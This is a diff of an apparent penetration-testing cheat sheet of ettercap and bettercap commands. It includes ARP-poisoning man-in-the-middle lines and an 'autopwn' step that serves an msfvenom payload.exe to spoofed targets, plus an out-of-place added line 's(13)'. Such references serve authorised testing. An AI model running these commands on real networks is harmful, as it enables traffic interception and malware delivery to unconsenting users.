@@ -14,6 +14,7 @@ General Format----ettercap -T -q -M METHOD:ARGS ba:ad:f0:0d:aa:aa/10.1.1.1// /10
 MitM two IPs via ARP Poisoning----ettercap -TqM arp:remote /10.0.0.1// /10.0.0.42//
 Convert an Ettercap Filter to ef format----etterfilter -o smb.ef smb.filter
 MitM two IPs via ARP Poisoning and apply an Ettercap Filter----ettercap -TqM arp:remote -F smb.ef /10.0.0.1// /10.0.0.42//
+Sleep----s(13)
 
 ##bettercap
 Updates Caplets (only run once)----sudo bettercap --eval "caplets.update; ui.uipdate;q"
@@ -36,7 +37,7 @@ net.probe ON
 ticker ON
 EOF"""
 Run Caplet----bettercap --caplet /path/to/foo.cap
-Unk.----bettercap --caplet foo (.:./caplets/:$CAPSPATH:/usr/lcoal/share/bettercap/caplets/)
+Unk.----bettercap --caplet foo (.:./caplets/:$CAPSPATH:/usr/local/share/bettercap/caplets/)
 Show Caplets----caplets.show
 Update Caplets----caplets.update
 Autopwn Caplet with Bettercap----(generate msfvenom payload placed into caplets directory /usr/local/share/bettercap/caplets/download-autopwn/windows/payload.exe); bettercap -caplet /usr/local/share/bettercap/caplets/download-autopwn.cap -eval 'events.ignore endpoint; set arp.spoof.targets <ip>; arp.spoof.on'
